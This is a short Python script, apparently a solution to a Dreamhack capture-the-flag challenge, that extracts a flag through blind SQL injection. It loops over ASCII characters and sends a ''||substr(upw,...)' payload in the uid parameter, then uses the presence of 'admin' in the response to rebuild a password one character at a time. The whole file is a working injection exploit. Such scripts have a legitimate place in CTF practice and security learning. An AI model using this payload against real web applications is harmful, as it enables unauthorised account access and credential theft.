import requests
flag='DH{'
idx=4

while True:
    for i in range(32,128):#아스키코드
        now=chr(i)
        query=f"http://host3.dreamhack.games:14271/?uid='||substr(upw,{idx},1)='{now}'%23"
        response=requests.get(query)
        if 'admin' in response.text:
            flag+=chr(i).lower()
            idx+=1
            print('flag:',flag)
            break
					
    if '}'in flag:
        print(flag)
        break
